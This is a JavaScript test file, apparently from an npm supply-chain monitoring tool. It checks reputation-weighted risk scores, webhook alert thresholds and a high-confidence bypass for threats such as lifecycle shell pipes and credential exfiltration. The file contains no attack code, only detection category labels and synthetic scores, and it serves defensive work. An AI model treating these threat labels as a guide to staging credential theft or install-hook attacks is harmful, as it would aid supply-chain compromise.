      delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  // ===== v2.7.6 Integration: established + FP → suppressed, established + HC → sent =====

  test('MONITOR: integration — Playwright-like FP suppressed (factor 0.10, raw 100 → adj 10, threshold 35)', () => {
    process.env.MUADDIB_WEBHOOK_URL = 'https://test.webhook.url';
    try {
      const rawScore = 100;
      const factor = computeReputationFactor({
        age_days: 4380,       // ~12 years
        version_count: 1700,
        weekly_downloads: 10000000
      });
      const adjustedScore = Math.round(rawScore * factor);
      assert(adjustedScore <= 10, `Adjusted score should be ≤10, got ${adjustedScore}`);

      const adjustedResult = {
        threats: [{ type: 'env_access', severity: 'HIGH' }],
        summary: { riskScore: adjustedScore, critical: 0, high: 1, medium: 0, low: 0, reputationFactor: factor }
      };
      const threshold = getWebhookThreshold(factor);
      assert(threshold === 35, `Threshold should be 35 for factor ${factor}`);
      assert(!shouldSendWebhook(adjustedResult, null),
        `Playwright-like FP should be suppressed: adj=${adjustedScore} < threshold=${threshold}`);
    } finally {
      delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  test('MONITOR: integration — established + lifecycle_shell_pipe bypasses reputation', () => {
    // Simulates supply-chain compromise of established package
    const result = {
      threats: [
        { type: 'lifecycle_shell_pipe', severity: 'CRITICAL' },
        { type: 'suspicious_dataflow', severity: 'HIGH' }
      ],
      summary: { riskScore: 80, critical: 1, high: 1, medium: 0, low: 0 }
    };
    // hasHighConfidenceThreat should return true → reputation BYPASSED → raw score used
    assert(hasHighConfidenceThreat(result) === true,
      'lifecycle_shell_pipe should trigger HC bypass');

    process.env.MUADDIB_WEBHOOK_URL = 'https://test.webhook.url';
    try {
      // Even if we had applied reputation (factor 0.10 → adj 8), the raw score
      // should be used because of HC bypass. Verify with raw score.
      assert(shouldSendWebhook(result, null),
        'Established package with lifecycle_shell_pipe should ALWAYS send (raw score used)');
    } finally {
      delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  test('MONITOR: integration — new suspicious package still sends (factor 1.0, threshold 20)', () => {
    process.env.MUADDIB_WEBHOOK_URL = 'https://test.webhook.url';
    try {
      const factor = computeReputationFactor({
        age_days: 3,
        version_count: 1,
        weekly_downloads: 5
      });
      const rawScore = 25;
      const adjustedScore = Math.round(rawScore * factor);
      assert(adjustedScore >= 20, `New package adjusted score should be ≥ 20, got ${adjustedScore}`);

      const result = {
        threats: [{ type: 'suspicious_dataflow', severity: 'HIGH' }],
        summary: { riskScore: adjustedScore, critical: 0, high: 1, medium: 0, low: 0, reputationFactor: factor }
      };
      assert(shouldSendWebhook(result, null),
        'New suspicious package should send (score amplified, threshold 20)');
    } finally {
      delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  test('MONITOR: shouldSendWebhook with sandbox clean + established + graduated threshold', () => {
    process.env.MUADDIB_WEBHOOK_URL = 'https://test.webhook.url';
    try {
      // Established package (factor 0.50) → threshold 35
      // Score 30 + HIGH → 30 < 35 → SUPPRESSED even though sandbox clean dormant
      const result = {
        threats: [{ type: 'env_access', severity: 'HIGH' }],
        summary: { riskScore: 30, critical: 0, high: 1, medium: 0, low: 0, reputationFactor: 0.50 }
      };
      const sandbox = { score: 0, severity: 'NONE' };
      assert(!shouldSendWebhook(result, sandbox),
        'Established package (factor 0.50, threshold 35) with score 30 + sandbox clean should be suppressed');
    } finally {
      delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  test('MONITOR: timer.unref called on scope group', () => {
    for (const [, group] of pendingGrouped) clearTimeout(group.timer);
    pendingGrouped.clear();

    const result = {
      threats: [],
      summary: { riskScore: 10 }
    };

    bufferScopedWebhook('@unref-test', '@unref-test/pkg', '1.0.0', 'npm', result, null);
    const group = pendingGrouped.get('@unref-test');
    assert(group, 'Should have pending group');
    // Timer was created — if unref exists, it was called (no crash = pass)
    clearTimeout(group.timer);
    pendingGrouped.clear();
  });

  // ===== v2.7.7 C1: Webhook embed bug fix =====

  asyncTest('MONITOR: flushScopeGroup single package has severity counts in summary', async () => {
    for (const [, group] of pendingGrouped) clearTimeout(group.timer);
    pendingGrouped.clear();

    const result = {
      threats: [
        { type: 'intent_credential_exfil', severity: 'CRITICAL' },
        { type: 'env_access', severity: 'HIGH' },
        { type: 'obfuscation_detected', severity: 'MEDIUM' }
      ],
      summary: { riskScore: 55 }
    };

    bufferScopedWebhook('@embed-test', '@embed-test/pkg', '1.0.0', 'npm', result, null);
    assert(pendingGrouped.has('@embed-test'), 'Should have pending group');

    // Inspect the stored entry to verify it has the right data
    const group = pendingGrouped.get('@embed-test');
    const pkg = group.packages[0];
    assert(pkg.threats.length === 3, `Should have 3 threats, got ${pkg.threats.length}`);

    // Flush without webhook URL → builds the result internally
    const prevUrl = process.env.MUADDIB_WEBHOOK_URL;
    delete process.env.MUADDIB_WEBHOOK_URL;
    try {
      clearTimeout(group.timer);
      await flushScopeGroup('@embed-test');
      assert(!pendingGrouped.has('@embed-test'), 'Group should be removed after flush');
    } finally {
      if (prevUrl !== undefined) process.env.MUADDIB_WEBHOOK_URL = prevUrl;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  test('MONITOR: flushScopeGroup single-package result has correct severity counts', () => {
    // Verify the logic that builds severity counts from threats
    const threats = [
      { type: 'intent_credential_exfil', severity: 'CRITICAL' },
      { type: 'env_access', severity: 'HIGH' },
      { type: 'obfuscation_detected', severity: 'MEDIUM' },
      { type: 'high_entropy_string', severity: 'LOW' }
    ];
    const critical = threats.filter(t => t.severity === 'CRITICAL').length;
    const high = threats.filter(t => t.severity === 'HIGH').length;
    const medium = threats.filter(t => t.severity === 'MEDIUM').length;
    const low = threats.filter(t => t.severity === 'LOW').length;
    assert(critical === 1, `Expected 1 CRITICAL, got ${critical}`);
    assert(high === 1, `Expected 1 HIGH, got ${high}`);
    assert(medium === 1, `Expected 1 MEDIUM, got ${medium}`);
    assert(low === 1, `Expected 1 LOW, got ${low}`);
    assert(threats.length === 4, `Expected total 4, got ${threats.length}`);
  });

  // ===== v2.7.7 C2: HC bypass severity check =====

  test('MONITOR: hasHighConfidenceThreat returns false for LOW severity HC type', () => {
    const result = {
      threats: [
        { type: 'intent_credential_exfil', severity: 'LOW' }
      ]
    };
    assert(hasHighConfidenceThreat(result) === false,
      'LOW severity intent_credential_exfil should NOT trigger HC bypass');
  });

  test('MONITOR: hasHighConfidenceThreat returns true for CRITICAL severity HC type', () => {
    const result = {
      threats: [
        { type: 'intent_credential_exfil', severity: 'CRITICAL' }
      ]
    };
    assert(hasHighConfidenceThreat(result) === true,
      'CRITICAL severity intent_credential_exfil should trigger HC bypass');
  });

  test('MONITOR: hasHighConfidenceThreat returns true for HIGH severity HC type', () => {
    const result = {
      threats: [
        { type: 'cross_file_dataflow', severity: 'HIGH' }
      ]
    };
    assert(hasHighConfidenceThreat(result) === true,
      'HIGH severity cross_file_dataflow should trigger HC bypass');
  });

  test('MONITOR: hasHighConfidenceThreat — mixed LOW HC + non-HC → false', () => {
    const result = {
      threats: [
        { type: 'intent_credential_exfil', severity: 'LOW' },
        { type: 'env_access', severity: 'HIGH' }
      ]
    };
    assert(hasHighConfidenceThreat(result) === false,
      'Only LOW HC type + non-HC type should return false');
  });

  test('MONITOR: hasHighConfidenceThreat — mixed LOW HC + CRITICAL HC → true', () => {
    const result = {
      threats: [
        { type: 'intent_credential_exfil', severity: 'LOW' },
        { type: 'lifecycle_shell_pipe', severity: 'CRITICAL' }
      ]
    };
    assert(hasHighConfidenceThreat(result) === true,
      'Should return true when at least one non-LOW HC type exists');
  });
}

module.exports = { runMonitorTests };
